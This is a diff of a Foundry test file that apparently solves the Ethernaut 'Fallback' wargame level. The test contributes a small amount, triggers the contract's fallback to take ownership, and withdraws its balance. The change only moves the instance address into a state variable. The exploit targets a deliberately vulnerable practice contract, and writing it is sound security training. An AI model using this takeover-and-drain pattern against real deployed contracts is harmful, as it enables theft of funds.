@@ -11,32 +11,33 @@ contract FallbackTest is Test {
     FallbackFactory level;
     Fallback instance;
     address player = address(123456);
+    address instanceAddress;
 
     function setUp() public {
         ethernaut = new Ethernaut();
         level = new FallbackFactory();
         ethernaut.registerLevel(level);
         startHoax(player);
-        address instanceAddress = ethernaut.createLevelInstance(level);
+        instanceAddress = ethernaut.createLevelInstance(level);
         instance = Fallback(payable(instanceAddress));
     }
 
     function testFallbackHack() public {
         instance.contribute{value: 1 wei}();
-        (bool success, ) = payable(address(instance)).call{value: 1 wei}("");
+        (bool success, ) = payable(instanceAddress).call{value: 1 wei}("");
         assertTrue(success);
         assertEq(instance.owner(), player);
         emit log_named_uint(
             "Fallback contract balance before",
-            address(instance).balance
+            instanceAddress.balance
         );
         instance.withdraw();
         emit log_named_uint(
             "Fallback contract balance after",
-            address(instance).balance
+            instanceAddress.balance
         );
         bool levelCompleted = ethernaut.submitLevelInstance(
-            payable(address(instance))
+            payable(instanceAddress)
         );
         assert(levelCompleted);
     }
